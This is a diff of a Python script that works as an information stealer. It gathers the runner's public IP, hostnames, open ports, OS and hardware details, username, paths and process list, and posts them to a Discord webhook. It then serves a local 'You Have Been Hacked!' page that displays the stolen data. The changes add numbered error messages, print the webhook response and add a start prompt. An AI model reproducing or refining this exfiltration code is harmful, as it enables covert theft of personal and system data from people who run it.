@@ -21,18 +21,18 @@ try:
 	ip = requests.get(f"http://ifconfig.me/ip").text
 except:
 	ip = ""
-	print("system error.")
+	print("system error. 01")
 try:
 	fwd = requests.get(f"http://ifconfig.me/forwarded").text
 	hops = fwd[fwd.find(",")+1:]
 	hops = ", ".join(hops.replace(",", " ").split())
 except:
-	print("system error.")
+	print("system error. 02")
 	hops = ""
 info.append(f"-")
 info.append(f"IP ADDRESS: || {ip} ||")
 info.append(f"HOP ADDRESSES: || {hops} ||")
-print(f"loading... %{random.randint(1, 5)}%")
+print(f"loading... {random.randint(1, 5)}%")
 try:
 	dnses = socket.gethostbyaddr(ip)
 	for hostname, n in zip(dnses, range(len(dnses))):
@@ -41,7 +41,7 @@ try:
 		else:
 			info.append(f"HOSTNAME {n+1}: || {hostname} ||")
 except:
-	print("system error.")
+	print("system error. 03")
 print(f"loading... {random.randint(6, 15)}%")
 opens = []
 for n in range(1, 255):
@@ -65,7 +65,7 @@ try:
 		h1 = h1.upper().replace("_", " ")
 		info.append(f"{h1}: || {h2} ||")
 except:
-	print("system error.")
+	print("system error. 04")
 print(f"loading... {random.randint(25, 45)}%")
 if os.name == "nt":
 	command = "ipconfig /all"
@@ -74,43 +74,34 @@ else:
 try:
 	output = subprocess.run(command, capture_output=True, text=True)
 except:
-	print("system error.")
+	print("system error. 05")
 try:
 	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nIFCONFIG OUTPUT: || {output} ||\nMACHINE TYPE: || {platform.machine()} ||\nOS FAMILY: || {platform.system_alias(platform.system(), platform.release(), 0)} ||")
 except:
-	print("system error.")
+	print("system error. 06")
 print(f"loading... {random.randint(45, 80)}%")
-try:
-	info.append(f"\nOS FREQUENCY: || {platform.system_frequency()} ||")
-except:
-	print("system error.")
 try:
 	info.append(f"PROCESS COUNT: || {len(psutil.pids())} ||")
 except:
-	print("system error.")
+	print("system error. 07")
 try:
 	info.append(f"PROCESSES: || {psutil.pids()} ||")
 except:
-	print("system error.")
-try:
-	info.append(f"APPLICATION COUNT: || {sum(1 for _ in psutil.process_iter())} ||")
-except:
-	print("system error.")
+	print("system error. 08")
 try:
 	info.append(f"MAIN PATH: || {os.path.expanduser('~')} ||")
 except:
-	print("system error.")
-try:
-	info.append(f"EXECUTABLE PATH: || {os.environ['PATH']} ||")
-except:
-	print("system error.")
+	print("system error. 09")
 info.append(f"-")
 print("loading... 100%")
 try:
 	data = {"content": "\n".join(info)}
-	requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
+	r = requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
+	print(r.text)
 except:
-	print("system error.")
+	print("system error. 10")
+print()
+input("[ Enter to start program ]")
 if os.name == "nt":
 	os.system("cls")
 else:
@@ -122,11 +113,13 @@ try:
 	s.listen(100)
 	display = []
 	for h in info:
+		h = h.replace("|", "")
 		if "\n" in h:
-			for h in h.split("\n"):
-				display.append("<h3>"+h.replace("|", "")+" </h3>")
+			for h1 in h.split("\n"):
+				display.append(f"<h3> {h1} </h3>")
 		else:
-			display.append("<h3>"+h.replace("|", "")+" </h3>")
+			display.append(f"<h3> {h} </h3>")
+	display = "\n".join(display)
 	p = f"<h1> You Have Been Hacked! :D </h1>\n<h2>Your info:</h2>\n{display}"
 	webbrowser.open("http://localhost:65535")
 	while True:
@@ -137,6 +130,6 @@ try:
 			print(f"{pack}")
 			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}".encode())
 		except:
-			pass
+			print("system error. 11")
 except:
-	pass
+	print("system error. 12")
